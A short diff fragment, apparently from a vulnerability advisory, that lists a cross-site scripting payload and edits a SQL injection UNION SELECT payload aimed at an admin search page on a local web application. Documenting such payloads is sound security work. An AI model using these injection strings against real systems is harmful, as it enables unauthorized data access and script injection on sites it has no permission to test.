@@ -26,7 +26,7 @@ payload -> <script>alert(1)</script>
 
 + SQL injection
 
-payload -> ' UNION SELECT 'a',NULL,NULL,NULL--
+payload -> ' UNION SELECT NULL,NULL,NULL--
 
 + http://localhost/osghs/admin/search.php
 
